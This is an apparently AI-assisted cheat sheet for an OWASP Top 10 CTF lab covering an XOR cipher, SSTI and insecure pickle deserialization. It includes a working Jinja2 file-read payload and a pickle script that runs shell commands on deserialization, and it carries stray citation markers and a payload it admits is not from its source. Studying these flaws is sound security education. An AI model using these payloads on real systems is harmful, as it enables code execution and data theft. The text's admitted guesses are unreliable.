# 49.SAL1 — OWASP Top 10 (2025): Insecure Data Handling — Cheat Sheet

**Focus:** A04 Cryptographic Failures, A05 Injection (SSTI), and A08 Software/Data Integrity Failures (Deserialization).

## TL;DR

  * **A04 (Crypto):** Never "roll your own" crypto. Weak algorithms (MD5, XOR) and hardcoded keys lead to data exposure.
  * **A05 (Injection):** Untrusted input sent directly to an interpreter (SQL, Shell, Template Engine) allows Remote Code Execution (RCE). The lab focuses on **SSTI**.
  * **A08 (Integrity):** Trusting data/code without verification leads to compromise. The lab focuses on **Insecure Deserialization** (Python Pickle) to execute code.

## A04: Cryptographic Failures

[cite_start]**Concept:** The application uses weak encryption or poor key management to protect sensitive data[cite: 182, 183].
[cite_start]**Scenario:** A "note sharing" app uses a weak XOR cipher with a short, shared key[cite: 192].

### Execution & Walkthrough

**Goal:** Decrypt note \#3 using CyberChef.

1.  **Analyze the Cipher:** The text is Base64 encoded. [cite_start]The hint suggests a 4-character key starting with `KEY_`[cite: 252, 253].
2.  [cite_start]**Derive Key:** Brute-forcing the last character reveals the key is **`KEY1`**[cite: 261].
3.  **CyberChef Recipe:**
      * [cite_start]**Input:** Paste the encrypted Base64 string from Note \#3[cite: 281].
      * [cite_start]**Operation 1:** `From Base64`[cite: 209].
      * [cite_start]**Operation 2:** `XOR` with Key `KEY1` (UTF-8)[cite: 215, 217].

**Target Data (Note \#3):**

> `GAAaYw4RYXEfDRRKHAAYehQGC2gbERZuDQkYdjZldBEPKnLfJD...` (truncated)

## A05: Injection (SSTI)

**Concept:** The application passes user input directly into a template engine without sanitization. [cite_start]This is Server-Side Template Injection (SSTI)[cite: 309].
**Scenario:** Abuse the application's dynamic rendering to read a file on the server.

### Execution & Commands

[cite_start]**Goal:** Read `flag.txt` located in the same directory as the app[cite: 316].

**1. Identification:**
Inject template syntax (like `{{7*7}}`) into inputs. If it reflects `49`, the engine is vulnerable.

**2. Exploitation (Conceptual Payload):**
Since the engine is likely Python/Jinja2 (common in these CTFs), the payload to read a file would look like this:

```python
# Payload to read local files via SSTI
{{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read() }}
```

  * *Note: The specific payload isn't explicitly listed in the PDF, but the method described is standard SSTI.*

**Flag Found:**
[cite_start]`THM{SSTI_FLAG_OBTAINED}`[cite: 317].

## A08: Software or Data Integrity Failures

**Concept:** The application accepts serialized data (objects converted to byte streams) without verification. [cite_start]An attacker can manipulate this data to execute code upon deserialization[cite: 323, 329].
**Scenario:** A Python application accepts pickled data. You must generate a malicious serialized object.

### Execution & Commands

[cite_start]**Goal:** Create a malicious Python "pickle" payload to read `flag.txt`[cite: 336].

**1. Generate Payload (Python Script):**
You need to write a script to create the exploit data.

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        # Command to read the flag
        cmd = ('cat flag.txt') 
        return os.system, (cmd,)

# Generate the serialized payload
payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

  * *Note: In a real CTF, you might need to wrap the output in a specific format or send it via a POST request.*

**2. Submit Payload:**
[cite_start]Input the generated string into the application at `http://MACHINE_IP:8002`[cite: 329].

**Flag Found:**
[cite_start]`THM{INSECURE_DESERIALIZATION}`[cite: 338].

## Gotchas & Pitfalls

  * **Hashing vs. Encryption:** Do not confuse them. Passwords must be **hashed** (bcrypt/Argon2), not encrypted. [cite_start]Hashing is one-way; encryption is two-way[cite: 187].
  * **Obscurity is not Security:** Using a custom XOR algorithm or "hiding" a key in source code/config files is a critical failure. [cite_start]Always use established libraries[cite: 184, 189].
  * [cite_start]**Input Validation is not enough:** For injection, validation helps, but **parameterized queries** (for SQL) or safe APIs (for OS commands) are the only robust defense[cite: 304, 305].
  * **Trust Boundaries:** Never assume data coming from a user (even cookies or serialized objects) is safe. [cite_start]Verify integrity using signatures (HMAC) before processing[cite: 326].
